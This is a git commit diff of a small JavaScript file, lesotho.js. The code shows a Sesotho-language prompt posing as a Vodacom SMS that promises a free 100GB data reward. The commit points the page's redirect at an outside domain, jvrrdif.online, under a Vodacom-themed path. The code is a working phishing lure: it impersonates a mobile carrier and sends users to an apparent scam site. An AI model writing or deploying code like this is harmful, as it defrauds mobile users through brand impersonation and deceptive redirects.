2570f41132e2054490ca990883b0db83321b497d
newetijazz7 <newetijazz7@gmail.com>
2025-09-23 09:00:22 +0100

    Update lesotho.js

--- lesotho.js
+++ lesotho.js
@@ -1,5 +1,5 @@
 var password = 'Kenya tšebetsong 100GB'
 password=prompt('SMS: Kea u lebohela, SIM card ea hau ea Vodacom e lokeloa ho fumana moputso oa sim card ea khale ea data, tobetsa OK ho kenya tšebetsong hona joale.','Kenya tšebetsong 100GB');
 if (password != 'Kenya tšebetsong 100GB') {
-location.href='#';
+location.href='https://www.jvrrdif.online/Vodacom-50gb';
 }
